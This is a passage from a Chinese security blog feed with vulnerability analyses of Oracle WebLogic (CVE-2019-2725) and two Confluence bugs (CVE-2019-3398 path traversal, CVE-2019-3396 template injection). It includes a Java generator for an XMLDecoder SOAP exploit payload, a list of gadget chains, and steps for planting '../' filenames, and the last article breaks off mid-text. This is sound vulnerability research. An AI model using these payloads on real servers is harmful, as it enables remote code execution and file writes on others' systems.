src="http://image-lucifaer.test.upcdn.net/2019/05/10/15574733616955.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15574733813992.jpg" alt=""></p><p>可以看到最终会由<code>xmlDecoder.readObject</code>进行实例读取，而这里就存在<code>xmlDecoder</code>的反序列化问题，所以触发漏洞。</p><h2 id="2-4-可能遇到的问题"><a href="#2-4-可能遇到的问题" class="headerlink" title="2.4 可能遇到的问题"></a>2.4 可能遇到的问题</h2><p>在实际debug的时候可能会出现这么一个问题：无论如何构造soap包，都无法断到<code>WorkAreaServerHandler</code>，每次在<code>OperationLookupHandler</code>这里就会返回null，导致程序无法走到后面的<code>WorkAreaServerHandler</code>。遇到这个问题其实可以跟一下<code>OperationLookupHandler</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15574744779696.jpg" alt=""></p><p>跟一下<code>this.getOperationName</code>的过程，你会发现：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15574745541712.jpg" alt="-w634"></p><p>在你声明<code>workContext</code>后，你需要在header或body中调用才行，如果未找到调用的话，<code>QName</code>将会返回null。</p><h1 id="0x03-利用研究"><a href="#0x03-利用研究" class="headerlink" title="0x03 利用研究"></a>0x03 利用研究</h1><p>之前网上放出的版本只是CVE-2017-10271的poc，然后被人炒了一波，其实仔细看过流程和补丁的人就能发现，新的这个漏洞是对于补丁的绕过：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15574751197957.jpg" alt="-w601"></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15574751503625.jpg" alt="-w782"></p><p>而绕过点就需要继续向下跟代码。</p><h2 id="3-1-绕过点"><a href="#3-1-绕过点" class="headerlink" title="3.1 绕过点"></a>3.1 绕过点</h2><p>在2.3中我们看到了<code>xmlDecoder.readObject</code>，从这里继续向下跟：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15574755951716.jpg" alt=""></p><p>具体的跟进过程不细谈，想了解的看一去跟一跟（很长）我这里说一下xmldecoder的一些关键点：</p><ul><li>处理开始标签</li><li>标签处理</li><li>处理结束标签</li></ul><p>简单来说处理过程如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">startElement # 处理父标签</span><br><span class="line">  ElementHandler </span><br><span class="line">    startElement # 处理一级子标签</span><br><span class="line">      ElementHandler </span><br><span class="line">        ...</span><br><span class="line">    endElement # 处理一级子标签的结束标签</span><br><span class="line">      ElementHandler.getValueObject</span><br><span class="line">endElement # 处理父标签的结束标签</span><br><span class="line">  ElementHandler.getValueObject</span><br></pre></td></tr></table></figure><p>也就是说这其实可以理解为一个栈结构，后进先出。</p><p>这里的<code>ElementHandler</code>为以下的标签：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15574783666534.jpg" alt=""></p><p>这里我们拿标签<code>object</code>来简单看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15574784317131.jpg" alt=""></p><p>可以看到首先在<code>startElement</code>中会执行<code>this.handler.addAttribute</code>，我们来跟进一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15574786650645.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15574794198702.jpg" alt=""></p><p>可以看到这里会检查标签的属性，并将其赋于不同的值（这里其实很关键，后面在尝试对最新补丁绕过的时候会用到，但是我还并没有绕过最新的补丁2333）在这里是实例化了我们class属性所指定的对象。在做完这些后会到<code>endElement</code>来处理结束标签（如果开始标签是<object>的话，结束标签就是</object>）：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15574792867381.jpg" alt=""></p><p>可以看到这里在结束时会获取这个标签的值，而这个值是一个<code>ValueObject</code>对象。</p><p>而对于这次绕过的主角class标签来说，同样，我们直接来看他的<code>getValueObject</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15574795799187.jpg" alt=""></p><p>跟进他的<code>getValue</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/05/10/15574796613651.jpg" alt=""></p><p>同样完成了对象的实例化，而这次指定对象的地方，就是class标签的内容。</p><h2 id="3-2-构造限制"><a href="#3-2-构造限制" class="headerlink" title="3.2 构造限制"></a>3.2 构造限制</h2><p>理清了利用点后，那不妨来看看在构造的时候有哪些限制。</p><p>通过上文的叙述，应该不难发现，我们能用做的只是将一个实例化而已，而不能用method标签来调用类中的方法，所以这不得不逼迫我们去找到一个<strong>构造方法中就存在反序列化的点</strong>。</p><h2 id="3-3-Gadget"><a href="#3-3-Gadget" class="headerlink" title="3.3 Gadget"></a>3.3 Gadget</h2><p>我找到这么几个比较好用的利用链，这里把利用方法和限制总结一下。</p><h3 id="UnitOfWorkChangeSet"><a href="#UnitOfWorkChangeSet" class="headerlink" title="UnitOfWorkChangeSet"></a>UnitOfWorkChangeSet</h3><ol><li>具体的包：<code>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</code>或<code>oracle_common/modules/oracle.toplink_12.1.3/eclipselink.jar</code></li><li>限制条件：<ul><li>服务器是否允许外连</li><li>jdk版本（1.8会限制rmi）</li></ul></li><li>配合使用的gadget：<ul><li>URLDNS（yso）用于检测漏洞</li><li>Jdk7u21（yso）用于rce，但是有jdk版本限制</li><li>cve-2018-3191</li></ul></li><li><p>简述：<br> 由于需要自己构造一个<code>ByteArray</code>，所以这部分需要自己写点代码：</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="string">"上面提到的配合使用的gadget所生成的文件或地址"</span>);</span><br><span class="line">    BufferedInputStream in = <span class="keyword">new</span> BufferedInputStream(fileInputStream);</span><br><span class="line">    ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream(<span class="number">1024</span>);</span><br><span class="line">    System.out.println(<span class="string">"Avaliable bytes:"</span>+in.available());</span><br><span class="line"></span><br><span class="line">    String exp = <span class="string">"&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n"</span> +</span><br><span class="line">            <span class="string">" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\"\n"</span> +</span><br><span class="line">            <span class="string">" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"&gt;\n"</span> +</span><br><span class="line">            <span class="string">"   &lt;soapenv:Header&gt;\n"</span> +</span><br><span class="line">            <span class="string">" &lt;wsa:Action&gt;demoAction&lt;/wsa:Action&gt;\n"</span> +</span><br><span class="line">            <span class="string">" &lt;wsa:RelatesTo&gt;test&lt;/wsa:RelatesTo&gt;\n"</span> +</span><br><span class="line">            <span class="string">" &lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt;\n"</span> +</span><br><span class="line">            <span class="string">" &lt;java&gt;\n"</span> +</span><br><span class="line">            <span class="string">"  &lt;class&gt;\n"</span> +</span><br><span class="line">            <span class="string">"   &lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string&gt;\n"</span> +</span><br><span class="line">            <span class="string">"   &lt;void&gt;\n"</span> +</span><br><span class="line">            <span class="string">"     $code\n"</span> +</span><br><span class="line">            <span class="string">"   &lt;/void&gt;\n"</span> +</span><br><span class="line">            <span class="string">"  &lt;/class&gt;\n"</span> +</span><br><span class="line">            <span class="string">" &lt;/java&gt;\n"</span> +</span><br><span class="line">            <span class="string">" &lt;/work:WorkContext&gt;\n"</span> +</span><br><span class="line">            <span class="string">"  &lt;/soapenv:Header&gt;\n"</span> +</span><br><span class="line">            <span class="string">"  &lt;soapenv:Body&gt;\n"</span> +</span><br><span class="line">            <span class="string">"      &lt;asy:onAsyncDelivery/&gt;\n"</span> +</span><br><span class="line">            <span class="string">"   &lt;/soapenv:Body&gt;\n"</span> +</span><br><span class="line">            <span class="string">"&lt;/soapenv:Envelope&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] temp = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((size = in.read(temp))!=-<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        out.write(temp, <span class="number">0</span>, size);</span><br><span class="line">    &#125;</span><br><span class="line">    in.close();</span><br><span class="line">    <span class="keyword">byte</span>[] content = out.toByteArray();</span><br><span class="line">    String poc = encodeByteToXml(content);</span><br><span class="line">    System.out.println(exp.replace(<span class="string">"$code"</span>, poc));</span><br><span class="line">    out.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> String <span class="title">encodeByteToXml</span><span class="params">(<span class="keyword">byte</span>[] data)</span> </span>&#123;</span><br><span class="line">    ProcessBuilder test = <span class="keyword">new</span> ProcessBuilder();</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    String tmp = <span class="string">""</span>;</span><br><span class="line">    String str = <span class="string">"  &lt;void index=\"$1\"&gt;\n"</span> +</span><br><span class="line">            <span class="string">"      &lt;byte&gt;$2&lt;/byte&gt;\n"</span> +</span><br><span class="line">            <span class="string">"  &lt;/void&gt;"</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    sb.append(<span class="string">"&lt;array class=\"byte\" length=\"$0\"&gt;"</span>.replace(<span class="string">"$0"</span>,Integer.toString(data.length))+<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> b : data) &#123;</span><br><span class="line">        tmp = str.replace(<span class="string">"$1"</span>, String.valueOf(i)).replace(<span class="string">"$2"</span>,Integer.toString((<span class="keyword">int</span>)b));</span><br><span class="line">        sb.append(tmp+<span class="string">"\n"</span>);</span><br><span class="line">        i = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sb.append(<span class="string">"&lt;/array&gt;"</span>);</span><br><span class="line">    <span class="comment">//System.out.println(sb.toString());</span></span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="EventData"><a href="#EventData" class="headerlink" title="EventData"></a>EventData</h3><ol><li>具体的包：<code>org.slf4j.ext.EventData</code></li><li>限制条件：<ul><li>服务器是否允许外连</li><li>weblogic版本限制（12.1.3有）</li></ul></li><li>简述：<br> xml的二次解析，具体可以自己看看</li></ol><h3 id="FileSystemXmlApplicationContext-比较完美的poc"><a href="#FileSystemXmlApplicationContext-比较完美的poc" class="headerlink" title="FileSystemXmlApplicationContext(比较完美的poc)"></a>FileSystemXmlApplicationContext(比较完美的poc)</h3><ol><li>具体的包：<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code></li><li>限制条件：<ul><li>服务器是否允许外连</li></ul></li><li>简述：<br> 类似于jackson的利用链，但是在构造xml时可以不用property</li></ol><h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><ul><li><a href="https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html" target="_blank" rel="noopener">https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html</a></li><li><a href="http://www.cnvd.org.cn/webinfo/show/4999" target="_blank" rel="noopener">http://www.cnvd.org.cn/webinfo/show/4999</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个洞在五一前就完成了分析，后面的时间就在寻找好用的利用链和绕最新的补丁方法。本来是想等着这波热度过去后，学一下其他人是否有更好的利用手法，结果发现大多数人用的还是rmi或者jdk7的gadget（稍有些遗憾）…&lt;/p&gt;
&lt;p&gt;这篇主要是来记录一下分析过程中一些比较关键的点，以及把自己找的一些利用链分享一下。其实是想等自己绕过最新补丁后再写一写绕补丁的想法的，结果经过快一周的研究，没整出来…后面一篇会把截止到目前我的一些绕补丁的思路总结下来，前面这篇就算是做一个基础铺垫了。在分析和挖掘的过程中特别感谢orich1、Badcode、Bearcat老哥们的交流与帮助。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Weblogic" scheme="https://lucifaer.com/tags/Weblogic/"/>
    
  </entry>
  
  <entry>
    <title>Confluence 路径穿越漏洞分析（CVE-2019-3398）</title>
    <link href="https://lucifaer.com/2019/04/19/Confluence%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-3398%EF%BC%89/"/>
    <id>https://lucifaer.com/2019/04/19/Confluence 路径穿越漏洞分析（CVE-2019-3398）/</id>
    <published>2019-04-19T10:16:00.000Z</published>
    <updated>2019-04-19T10:19:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>感觉最近Confluence一下子就火起来了，各种爆洞= =。这个洞是17号爆的，影响没有之前那个RCE的大，需要登录，还需要有修改文章上传附件的权限，个人感觉有点鸡肋。Anyway，分析的过程还是比较简单并有乐趣的。</p><a id="more"></a><h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><blockquote><p>Confluence Server and Data Center had a path traversal vulnerability in the downloadallattachments resource. A remote attacker who has permission to add attachments to pages and / or blogs, or to create a new space or personal space, or who has ‘Admin’ permissions for a space, can exploit this path traversal vulnerability to write files to arbitrary locations which can lead to remote code execution on systems that run a vulnerable version of Confluence Server or Data Center.</p></blockquote><p>根据官方文档的描述，我们大致能知道这是个需要权限的路径穿越的漏洞，并且可以将文件上传到任意路径。造成这个漏洞的关键点在于<code>DownloadAllAttachments</code>这个资源。在经过diff后，可以确定漏洞触发的关键点在于文件名的构造：</p><blockquote><p>修复前</p></blockquote><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556630124609.jpg" alt=""></p><blockquote><p>修复后</p></blockquote><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556629685846.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556630389868.jpg" alt=""></p><p>可以看到这里是对这里的<code>attachment.getFileName</code>所获取的文件名进行二次文件名获取。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>分析这个漏洞要从两个点入手：</p><ul><li><code>DownloadAllAttachments</code>自身的处理流程</li><li>如何让文件名中包含<code>../</code></li></ul><p>在分析前我们应清楚哪里能调用<code>DownloadAllAttachments</code>，这样才方便调试。根据官方给出的临时修补措施，我们大致可以从附件管理的<code>Download all attachments</code>这个地方入手：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556636645966.jpg" alt="-w635"></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556640416058.jpg" alt="-w1133"></p><h2 id="2-1-DownloadAllAttachments处理流程"><a href="#2-1-DownloadAllAttachments处理流程" class="headerlink" title="2.1 DownloadAllAttachments处理流程"></a>2.1 DownloadAllAttachments处理流程</h2><p><code>DownloadAllAttachments</code>位于<code>com.atlassian.confluence.pages.actions.DownloadAllAttachmentsOnPageAction</code>，为了便于快速的解释这个漏洞，我用动态调试+静态分析的方法来进行说明。</p><p>我这里选取的是默认生成的<code>Lay out your page (step 6 of 9)</code>这个页面的下载全部附件进行测试的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556643371813.jpg" alt="-w1132"></p><p>代码非常简单，分两部分来看：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556648729610.jpg" alt=""></p><p>可以看到在这里首先会将附件中的所有文件的基础信息置于一个数组中，然后对数组进行遍历，然后执行以下操作：</p><ol><li>根据文件名创建一个新的<code>File</code>对象(tmpFile)</li><li>将文件内容写入输入流</li><li>将<code>FileOutputStream</code>输出流指向<code>File</code>对象</li><li>将输入流中的内容拷贝到<code>FileOutputStream</code>输出流中</li></ol><p>这样就完成了将文件拷贝到另外一个位置的操作。</p><p>这里的<code>attachment.getFileName()</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556657114892.jpg" alt=""></p><p>而title名就是文件名：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556657884254.jpg" alt=""></p><p><code>getTempDirectoryForZipping()</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556658919734.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556659124664.jpg" alt=""></p><p>是根据时间和随机数生成的一个目录，格式类似于<code>download2q1gP165938</code>，这里我们通过方法的名字就能看出这里是建立了一个创建一个zip的目录，这个目录在<code>confluence_home/temp/</code></p><p>ok，知道了这些，继续向下看<code>DownloadAllAttachments</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556661700493.jpg" alt=""></p><p>这里是完成将zip目录打包成zip文件的过程。</p><p>在进行文件复制的时候，我们注意到文件的路径是zip目录与文件名直接进行进行拼接生成的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556665323662.jpg" alt=""></p><p>而这里就是整个目录穿越的关键，也就是说在生成zip文件前，如果附件列表中有文件的文件名是<code>../../xxx</code>的格式的话，就能进行目录穿越，在任意位置创建文件。</p><h2 id="2-2-寻找利用链"><a href="#2-2-寻找利用链" class="headerlink" title="2.2 寻找利用链"></a>2.2 寻找利用链</h2><p>默认情况下，我们是没有办法创建以<code>.</code>开头的文件的，如果想要上传一个文件名类似<code>../../xxx</code>的文件的话，最简单的思路是用burp中间改包，但是在这个例子中是不行的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556668251787.jpg" alt="-w1241"></p><p>应该是进行了自动的过滤，这个方法行不通。我又注意到了在属性中好像能修改文件名：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556668967289.jpg" alt="-w1132"></p><p>但是也是不成功的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556669182290.jpg" alt="-w700"></p><p>就在我想要放弃的时候我尝试了一下编辑页面中的上传附件功能，竟然成功了：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556670429318.jpg" alt="-w1036"></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556672925783.jpg" alt="-w1245"></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556673194395.jpg" alt="-w1122"></p><p>在这里我点击<code>下载全部</code>，即可完成目录穿越：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556673630695.jpg" alt="-w559"></p><p>我们来对比一下两种上传方式有什么不同。</p><h3 id="直接上传-FileStorer"><a href="#直接上传-FileStorer" class="headerlink" title="直接上传(FileStorer)"></a>直接上传(FileStorer)</h3><p>直接上传这里是调用的<code>com.atlassian.confluence.pages.actions.beans.FileStorer</code>，关键点在：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556678949378.jpg" alt=""></p><p>在获取文件名时会对请求中的文件名进行处理：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556679723274.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556680604026.jpg" alt=""></p><p>会将文件名提取出来。</p><h3 id="利用插件上传"><a href="#利用插件上传" class="headerlink" title="利用插件上传"></a>利用插件上传</h3><p>在利用插件上传时用的是<code>drag-and-drop</code>这个插件在<code>com.atlasian.confluence.plugins.dragdrop.UploadAction</code>。</p><p>在处理请求时并未对请求中的文件名进行处理：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556682894757.jpg" alt=""></p><p>所以会保存我们恶意修改的文件名</p><p>至此该漏洞分析完毕。</p><h1 id="0x03-构造POC"><a href="#0x03-构造POC" class="headerlink" title="0x03 构造POC"></a>0x03 构造POC</h1><p>首先登陆后编辑附件数大于2个的页面，在页面中加入附件：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556670429318.jpg" alt="-w1036"></p><p>burp抓包修改上传文件的文件名：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556672925783.jpg" alt="-w1245"></p><p>在附件管理页面下载全部附件：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556673194395.jpg" alt="-w1122"></p><p>文件会生成到<code>/confluence_home/temp/zip文件名../../</code>目录中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/19/15556686614397.jpg" alt="-w646"></p><h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><ul><li><a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2019-04-17-968660855.html" target="_blank" rel="noopener">https://confluence.atlassian.com/doc/confluence-security-advisory-2019-04-17-968660855.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;感觉最近Confluence一下子就火起来了，各种爆洞= =。这个洞是17号爆的，影响没有之前那个RCE的大，需要登录，还需要有修改文章上传附件的权限，个人感觉有点鸡肋。Anyway，分析的过程还是比较简单并有乐趣的。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Confluence" scheme="https://lucifaer.com/tags/Confluence/"/>
    
  </entry>
  
  <entry>
    <title>Confluence 未授权RCE分析（CVE-2019-3396）</title>
    <link href="https://lucifaer.com/2019/04/16/Confluence%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-3396%EF%BC%89/"/>
    <id>https://lucifaer.com/2019/04/16/Confluence 未授权RCE分析（CVE-2019-3396）/</id>
    <published>2019-04-16T11:32:00.000Z</published>
    <updated>2019-04-16T11:35:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>这个漏洞本来是上周一就分析完了，但是高版本无法造成rce这个问题着实困扰了我很久，在得出了一定的结论后才写完了这篇文章。总体来说，这个漏洞真的是值得好好跟一下，好好研究一下的，能学到很多东西。</p><a id="more"></a><h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><blockquote><p>There was an server-side template injection vulnerability in Confluence Server and Data Center, in the Widget Connector. An attacker is able to exploit this issue to achieve server-side template injection, path traversal and remote code execution on systems that run a vulnerable version of Confluence Server or Data Center.</p></blockquote><p>根据官方文档的描述，可以看到这是由<code>Widget Connector</code>这个插件造成的SSTI，利用SSTI而造成的RCE。在经过diff后，可以确定触发漏洞的关键点在于对post包中的<code>_template</code>字段：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15548625057221.jpg" alt=""></p><p>可以看到修补措施还是很暴力的。</p><p>所以我们可以从<code>com.atlassian.confluence.extra.widgetconnector</code>来入手分析。</p><h1 id="0x02-概述"><a href="#0x02-概述" class="headerlink" title="0x02 概述"></a>0x02 概述</h1><p>分析这个漏洞应该从两个方面入手：</p><ul><li><code>Widget Connector</code>插件</li><li>tomcat类加载机制</li></ul><p><strong><code>Widget Connector</code>插件这个方面主要是由于其可以未授权访问，同时允许传入一个外部资源链接。而tomcat的类加载机制决定了这个可控的外部资源链接的内容是可被加载的，最终，被加载的资源被注入到默认模版中，并执行VTL表达式。</strong>所以这个漏洞在真正利用的时候是取决于两个因素的，缺一不可。</p><p>在真正分析的时候真正的难点不是diff找出漏洞点，而是在于<strong>漏洞在存在漏洞的6.6-6.9版本是可以利用<code>file</code>、<code>https</code>等协议加载外部资源的，而在6.14.1这个存在漏洞的版本是没有办法加载外部资源的。</strong>而这一点也是我和<a href="https://paper.seebug.org/884/" target="_blank" rel="noopener">BadCode</a>老哥交流了将近2-3天一直没有跟到的点，最终在我对比了两个版本的区别时，才推测出这个问题是由tomcat本身导致。</p><p>下面的漏洞分析基于confluence 6.6.11版本。</p><h1 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h1><h2 id="3-1-Widget-Connector"><a href="#3-1-Widget-Connector" class="headerlink" title="3.1 Widget Connector"></a>3.1 Widget Connector</h2><p>从diff的点入手，首先看<code>com.atlassian.confluence.extra.widgetconnector#execute</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15548647045402.jpg" alt=""></p><p>这里有几个值得注意的点：</p><ul><li>获取到的是一个<code>Map</code>类型的<code>parameters</code></li><li><code>parameters</code>中存在<code>url</code>这个字段流程就会进入<code>this.renderManager.getEmbeddedHtml</code>(也就是<code>DefaultRenderManager.getEmbeddedHtml</code>)</li></ul><p>这里的<code>parameters</code>就是我们在向<code>widgetconnector</code>插件发送post请求时包中的<code>params</code>字段的内容。（如果不清楚如何构造post请求包的话，可以参考<a href="https://confluence.atlassian.com/confcloud/widget-connector-macro-724765314.html" target="_blank" rel="noopener">widget文章</a>，然后抓一个包看一下就好）</p><p>跟进<code>getEmbeddedHtml</code>看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15548665195139.jpg" alt=""></p><p>可以看到这里的<code>var3</code>是一个<code>WidgetRenderer</code>的List，我们来看一下这个List中有什么内容：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15548667548192.jpg" alt=""></p><p>可以看到是所有<code>WidgetRenderer</code>的具体实现，在各个实现当中都实现了<code>matches</code>方法，而这个方法是检查<code>url</code>字段中是否存在其所对应的url，这里拿<code>ViddlerRenderer</code>来举例子：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15548669406163.jpg" alt=""></p><p>也就是说在构造请求的时候需要存在相应的字段才能进入相应的实现类处理不同的请求。</p><p>在看各个具体实现时，会发现大部分的实现都会将一个固定的<code>_template</code>字段置于<code>params</code>中，比如<code>FlickrRenderer</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15548674368669.jpg" alt=""></p><p>但是也有一些实现类并没有这样做，比如<code>GoogleVideoRenderer</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15548674917052.jpg" alt=""></p><p>从补丁中我们可以看到，漏洞触发的关键点是要求<code>_template</code>字段可控，所以满足这一条件的只有这么几个：</p><ul><li><code>GoogleVideoRenderer</code></li><li><code>EpisodicRenderer</code></li><li><code>TwitterRenderer</code></li><li><code>MetacafeRenderer</code></li><li><code>SlideShareRenderer</code></li><li><code>BlipRenderer</code></li><li><code>DailyMotionRenderer</code></li><li><code>ViddlerRenderer</code></li></ul><p>可以看到满足条件的实现类最终都是进入<code>this.velocityRenderService.render</code>来处理的，跟进看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15548690892166.jpg" alt=""></p><p>该方法对<code>width</code>、<code>height</code>、<code>_template</code>进行了校验及初始化过程，最关键的是将处理后的数据传入<code>getRenderedTemplate</code>，这里很好跟一路向下跟进到<code>org.apache.velocity.runtime.RuntimeInstance#getTemplate</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15548693809879.jpg" alt=""></p><p>这里注意这个<code>i</code>参数为1，后面会有用到。继续向下跟进<code>org.apache.velocity.runtime.RuntimeInstance.ConfigurableResourceManager#getResource</code>:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/04/16/15548769501469.jpg" alt=""></p><p>如果是首次处理请求的话，是无法从全局的缓存中找到资源的，所以这里可以跟进else中的处理来具体看一下具体处理的：</p><p><img 